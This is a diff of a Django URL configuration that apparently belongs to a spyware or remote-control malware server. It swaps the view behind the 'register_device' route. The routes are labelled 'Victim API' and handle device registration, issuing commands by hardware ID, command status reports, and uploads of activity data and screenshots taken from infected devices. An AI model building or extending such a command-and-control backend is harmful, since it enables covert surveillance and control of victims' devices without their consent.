@@ -2,18 +2,18 @@ from django.urls import path
 
 from core.views import (
     GetDeviceDataAndCommandsView,
-    RegisterDeviceView,
     ReportCommandStatusView,
     UploadActivityDataView,
     UploadScreenshotView,
     check_new_screenshot,
+    device_create_or_update,
     device_list_api,
     latest_screenshot,
 )
 
 urlpatterns = [
     # Victim API
-    path("register_device/", RegisterDeviceView.as_view(), name="register_device"),
+    path("register_device/", device_create_or_update, name="register_device"),
     path(
         "get_data_and_commands/<str:hardware_id>/", GetDeviceDataAndCommandsView.as_view(), name="get_data_and_commands"
     ),
